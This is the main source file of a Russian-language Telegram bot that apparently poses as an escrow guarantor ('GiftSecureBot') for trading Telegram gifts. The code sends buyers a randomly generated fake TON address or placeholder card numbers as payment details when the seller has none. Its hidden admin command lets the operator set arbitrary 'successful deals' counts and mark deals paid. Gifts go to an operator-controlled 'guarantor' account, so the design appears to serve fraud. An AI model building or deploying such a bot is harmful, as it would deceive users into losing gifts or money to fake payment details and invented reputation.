import 'dotenv/config'
import { Telegraf, Scenes, session } from 'telegraf'
import { initDB } from './db.js'
import db from './db.js'

// команды/сцены
import start, { lastStartMessageId } from './commands/start.js'
import deeplink from './commands/deeplink.js'
import niklastore from './commands/niklastore.js'
import { walletManageScene } from './scenes/walletManage.js'
import { createDealWizard } from './scenes/createDeal.js'
import { adminMenuKb, buyerGiftKb, mainMenuKb } from './keyboards.js'

await initDB()
if (!process.env.BOT_TOKEN) {
  console.error('❌ BOT_TOKEN не задан')
  process.exit(1)
}
const bot = new Telegraf(process.env.BOT_TOKEN)

// username для диплинков
let BOT_USERNAME = process.env.BOT_USERNAME || null
if (!BOT_USERNAME) {
  try {
    const me = await bot.telegram.getMe()
    BOT_USERNAME = me?.username || null
    if (BOT_USERNAME) process.env.BOT_USERNAME = BOT_USERNAME
  } catch (err) {
    console.warn('Warning: getMe() failed', err?.description || err?.message || err)
  }
}

const stage = new Scenes.Stage([walletManageScene, createDealWizard])
bot.use(session())
bot.use(stage.middleware())

// /start
bot.start(async (ctx) => {
  try { await ctx.scene.leave() } catch {}
  if (ctx.startPayload && ctx.startPayload.trim().length > 0) {
    return deeplink(ctx)
  }
  return start(ctx)
})

// /niklastore -> админ
bot.command('niklastore', niklastore)

// меню
bot.action('deal:create', async (ctx) => {
  if (lastStartMessageId) {
    try { await ctx.telegram.deleteMessage(ctx.chat.id, lastStartMessageId) } catch {}
  }
  return ctx.scene.enter('create-deal')
})
bot.action('wallet:manage', async (ctx) => {
  if (lastStartMessageId) {
    try { await ctx.telegram.deleteMessage(ctx.chat.id, lastStartMessageId) } catch {}
  }
  return ctx.scene.enter('wallet-manage')
})

bot.action('help:how', async (ctx) => {
  try { await ctx.answerCbQuery() } catch {}
  try { await ctx.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id) } catch {}
  await ctx.reply(
`Как работает:

1) Продавец создаёт сделку → статус «Ожидание подарка гаранту @GiftSecureSupport».
2) Продавец жмёт «Подарок отправлен», затем «Скриншот отправлен».
3) Админ подтверждает скриншот.
4) Покупателю отправляются реквизиты → он оплачивает.
5) Статусы: waiting_gift → gift_sent → await_payment → paid → завершено.`,
    { ...mainMenuKb() }
  )
})

// === ПРОДАВЕЦ: Подарок отправлен ===
bot.action(/seller:gift_sent:(.+)/, async (ctx) => {
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.answerCbQuery('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.answerCbQuery('Не ваша сделка.')

  deal.status = 'gift_sent'
  deal.log ||= []
  deal.log.push('Продавец: подарок отправлен гаранту.')
  await db.write()

  // новая формулировка
  await ctx.reply('✅ Подарок отправлен гаранту! Попросите *продавца* прислать скриншот передачи подарка покупателю.', { parse_mode: 'Markdown' })

  if (deal.buyerId) {
    try {
      await ctx.telegram.sendMessage(
        deal.buyerId,
        '📦 Продавец отправил подарок гаранту. Ожидаем скриншот передачи подарка покупателю.'
      )
    } catch {}
  }
})

// === ПРОДАВЕЦ: Скриншот отправлен ===
bot.action(/seller:shot_sent:(.+)/, async (ctx) => {
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.answerCbQuery('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.answerCbQuery('Не ваша сделка.')

  deal.log ||= []
  deal.log.push('Продавец отправил скриншот передачи подарка.')
  await db.write()

  await ctx.reply('📸 Скриншот отправлен. Ожидаем подтверждение от администратора.')

  // уведомить покупателя
  if (deal.buyerId) {
    try {
      await ctx.telegram.sendMessage(
        deal.buyerId,
        '📸 Продавец отправил скриншот передачи подарка. Ожидаем подтверждение администратором.',
        buyerGiftKb(deal.token)
      )
    } catch {}
  }

  // уведомить всех админов с кнопкой подтверждения
  const admins = Object.values(db.data.users || {}).filter(u => u.admin)
  for (const a of admins) {
    try {
      await ctx.telegram.sendMessage(
        a.id,
        `🛡️ Запрос подтверждения скриншота по сделке ${deal.code}.`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: '✅ Скриншот получен', callback_data: `admin:shotok:${token}` }]]
          }
        }
      )
    } catch {}
  }
})

// === АДМИН: подтверждение скриншота → ожидание оплаты и реквизиты ===
function fakeTon() {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
  let s = 'UQ'
  for (let i = 0; i < 46; i++) s += alphabet[Math.floor(Math.random()*alphabet.length)]
  return s
}
function detectRubType(val = '') {
  const v = (val || '').replace(/\s+/g, '')
  const looksLikeCard = /^\d{16,19}$/.test(v)
  const looksLikePhone = /^(\+7|7|8)\d{10}$/.test(v)
  return looksLikeCard ? 'card' : (looksLikePhone ? 'phone' : null)
}
bot.action(/admin:shotok:(.+)/, async (ctx) => {
  await db.read()
  const me = db.data.users[ctx.from.id]
  if (!me?.admin) return ctx.answerCbQuery('Только администратор.')
  const token = ctx.match[1]
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.answerCbQuery('Сделка не найдена.')

  deal.status = 'await_payment'
  deal.log ||= []
  deal.log.push('Админ подтвердил скриншот. Ожидание оплаты от покупателя.')
  await db.write()

  const seller = db.data.users[deal.sellerId] || {}
  const w = seller.wallets || {}
  let payLine = ''
  if (deal.currency === 'TON') payLine = `TON адрес: \`${w.TON || fakeTon()}\``
  else if (deal.currency === 'RUB') {
    const rub = (w.RUB || '').trim()
    const t = detectRubType(rub)
    payLine = (t === 'phone')
      ? `Номер телефона: \`${rub}\``
      : `Карта: \`${rub || '2200 1234 5678 9012'}\``
  } else if (deal.currency === 'UAH') payLine = `Карта: \`${(w.UAH || '5375 1234 5678 9012').trim()}\``
  else if (deal.currency === 'STARS') payLine =
    `Оплатите *${deal.amount} Stars* через *Fragment* (https://fragment.com) или *подарками*. _Комиссия на покупателе._`

  const msg =
`⏳ Ожидание оплаты от покупателя.
Сумма: *${deal.amount} ${deal.currency}*

Реквизиты:
${payLine}`

  try { await ctx.answerCbQuery('✅ Подтверждено') } catch {}
  try { await ctx.telegram.sendMessage(deal.buyerId, msg, { parse_mode: 'Markdown' }) } catch {}
  try { await ctx.telegram.sendMessage(deal.sellerId, msg, { parse_mode: 'Markdown' }) } catch {}
})

// === классическая кнопка «Оплатить» (если оставляешь) ===
bot.action(/pay:(.+)/, async (ctx) => {
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.answerCbQuery('Сделка не найдена.', { show_alert: true })
  if (deal.sellerId === ctx.from.id) return ctx.answerCbQuery('Нельзя оплатить свою же сделку.', { show_alert: true })
  if (deal.status === 'paid') return ctx.answerCbQuery('Уже оплачено.', { show_alert: true })

  deal.status = 'paid'
  deal.buyerId = ctx.from.id
  deal.log ||= []
  deal.log.push('Покупатель отметил оплату.')
  await db.write()

  await ctx.answerCbQuery('✅ Оплачено!')
  try { await ctx.telegram.sendMessage(deal.sellerId, `✅ Покупатель оплатил сделку ${deal.code}.`) } catch {}
})

// === покупатель отменил ===
bot.action(/cancel:(.+)/, async (ctx) => {
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.status === 'paid') return ctx.reply('❌ Уже оплачено — отмена невозможна.')
  deal.status = 'canceled'
  deal.log ||= []
  deal.log.push('Сделка отменена покупателем.')
  await db.write()
  await ctx.reply('❌ Сделка отменена.')
})

// === админские вводы (успехи/mark paid) + дефолт ===
bot.on('message', async (ctx) => {
  const text = (ctx.message?.text || '').trim()
  if (ctx.session.adminAwaitSuccessCount) {
    const n = parseInt(text, 10)
    ctx.session.adminAwaitSuccessCount = false
    if (!isFinite(n) || n < 0) return ctx.reply('Введите корректное число.')
    await db.read()
    db.data.users[ctx.from.id] ||= { id: ctx.from.id }
    db.data.users[ctx.from.id].successCount = n
    await db.write()
    try { await ctx.deleteMessage() } catch {}
    return ctx.reply(`✅ Успешные сделки установлены: ${n}`, adminMenuKb())
  }
  if (ctx.session.adminAwaitCodePaid) {
    ctx.session.adminAwaitCodePaid = false
    const code = text
    await db.read()
    const deal = Object.values(db.data.deals || {}).find(d => d.code === code)
    try { await ctx.deleteMessage() } catch {}
    if (!deal) return ctx.reply('Сделка с таким кодом не найдена.', adminMenuKb())
    deal.status = 'paid'
    deal.log ||= []
    deal.log.push('Админ пометил как оплачено.')
    await db.write()
    try { await ctx.telegram.sendMessage(deal.sellerId, `✅ Сделка ${deal.code} помечена как оплаченная админом.`) } catch {}
    if (deal.buyerId) { try { await ctx.telegram.sendMessage(deal.buyerId, `ℹ️ Сделка ${deal.code} помечена как оплаченной админом.`) } catch {} }
    return ctx.reply(`✅ Готово. Сделка ${deal.code} → оплачено.`, adminMenuKb())
  }
  try { await ctx.deleteMessage() } catch {}
  return ctx.reply('Меню: /start', mainMenuKb())
})

// polling
await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {})
await bot.launch()
console.log('GiftSecureBot RUNNING ✅')

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))